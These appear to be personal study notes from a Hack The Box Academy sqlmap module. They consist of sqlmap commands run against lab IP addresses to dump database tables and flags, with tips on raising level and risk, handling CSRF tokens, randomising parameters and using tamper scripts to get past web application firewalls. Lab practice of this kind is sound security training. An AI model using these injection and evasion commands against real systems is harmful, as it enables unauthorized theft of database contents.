sqlmap -u 'http://154.57.164.66:30409/case3.php' --cookie="id=1" --level=2 --batch --dump
-for or based sqli you might have to raise the level to 3 and the risk to 5
-sqlmap -u 'http://154.57.164.82:31527/case6.php?col=id' -p col --level=2 --batch --dump --prefix='`)'  sometimes there are non standard boundries
-sqlmap -u 'http://154.57.164.82:31527/case7.php?id=1' --level=5 --risk=3  --union-cols=5 --batch --dump COUNT THE NUMBER OF COLUMNS
-sqlmap -u 'http://154.57.164.82:31527/case1.php?id=1' --batch --tables -D testdb -T flag1 --dump 
-sqlmap -u 'http://154.57.164.82:31527/case1.php?id=1' --search -C style
https://academy.hackthebox.com/app/module/58/section/530 waf bypass ip concealing csrf protection
-sqlmap -r req1 --batch  --csrf-token="t0ken"
-sqlmap -u 'http://154.57.164.75:30595/case9.php?id=1&uid=3757230212' --randomize=uid --batch -tables -D testdb -T flag9 --dump
-sqlmap -r req2 --batch -T flag10 --dump show the verbosity with -v 5 to see why it gets blocked
-sqlmap -u 'http://154.57.164.75:30595/case11.php?id=1' --tamper=between --batch  -p id  -T flag11 --dump
https://www.scribd.com/document/914604066/SQLMap-Essentials
-sqlmap -r req3 --batch -p id --level=5 --risk=3 --tamper=between -tables -D production -T "final_flag" --dump --no-cast




